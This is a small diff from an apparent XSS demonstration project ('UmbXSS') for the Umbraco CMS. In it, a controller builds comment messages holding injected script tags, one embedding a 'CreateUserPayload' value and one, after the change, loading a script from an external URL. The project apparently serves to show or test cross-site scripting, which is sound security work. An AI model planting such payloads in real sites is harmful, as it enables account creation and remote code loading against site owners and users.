@@ -43,7 +43,7 @@ namespace UmbXSS.Controllers
                     model.Message = $"Fantastic article!\n<script>{CreateUserPayload}</script>";
                     break;
                 case "XSS Demo 3":
-                    model.Message = "Unreal article!\n<script src=''></script>";
+                    model.Message = "Unreal article!\n<script src='[URL]'></script>";
                     break;
                 default:
                     break;
